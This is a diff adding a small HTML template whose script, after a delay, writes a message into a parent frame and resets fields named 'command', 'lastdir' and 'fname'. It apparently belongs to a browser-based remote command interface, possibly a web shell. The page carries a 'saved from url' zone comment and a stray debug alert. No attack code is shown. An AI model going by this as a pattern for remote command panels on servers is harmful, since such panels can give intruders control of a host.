@@ -1,0 +1,38 @@
+<!-- saved from url=(0022)http://internet.e-mail -->
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<META HTTP-EQUIV="Expires" CONTENT="0">
+<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate">
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+<META HTTP-EQUIV="Jon Eyrick" CONTENT="no-cache">
+<script>
+function w1()
+{
+
+var yy='<tbody>';
+	yy=yy+'<table width="100%" border="0" style="font-size:11pt" cellpadding="5" cellspacing="5">';
+	yy = yy + '<tr>';
+  yy = yy + '<td>[#msg#]</td>';
+  yy = yy + '</tr>';
+  yy=yy+'</table>';
+  yy = yy + '</tbody>';
+
+  parent.document.all.ff.innerHTML=(yy);
+ 
+ parent.document.all.command.value='';
+ parent.document.all.lastdir.value='[#lastcmd#]';
+ parent.document.all.fname.value='';
+ alert('ffff');
+
+}
+setTimeout('w1()',1000);
+
+ </SCRIPT> 
+
+</head>
+<body>
+
+</body>
+</html>
